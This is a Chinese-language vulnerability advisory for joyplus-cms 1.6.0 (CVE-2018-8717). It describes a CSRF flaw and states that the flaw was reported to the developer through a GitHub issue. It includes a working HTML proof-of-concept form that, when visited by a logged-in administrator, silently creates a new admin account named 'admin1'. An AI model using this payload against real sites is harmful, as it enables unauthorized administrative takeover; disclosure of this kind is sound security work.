### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|joyplus-cms 1.6.0存在CSRF漏洞可增加管理员账户|2018-03-14|yx（yx@5ecurity.cn）|[https://github.com/joyplus/joyplus-cms/](https://github.com/joyplus/joyplus-cms/) | [https://github.com/joyplus/joyplus-cms/](https://github.com/joyplus/joyplus-cms/) |1.6.0 | [CVE-2018-8717](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8717)|  

#### 漏洞概述  

> joyplus-cms 1.6.0存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。joyplus-cms是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/joyplus/joyplus-cms/issues/419)告知作者。  

### POC实现代码如下：  

> CSRF测试页面代码如下：
``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&tab={pre}manager" method="POST">
      <input type="hidden" name="m&#95;id" value="" />
      <input type="hidden" name="flag" value="add" />
      <input type="hidden" name="m&#95;name" value="admin1" />
      <input type="hidden" name="m&#95;password" value="admin1" />
      <input type="hidden" name="m&#95;status" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
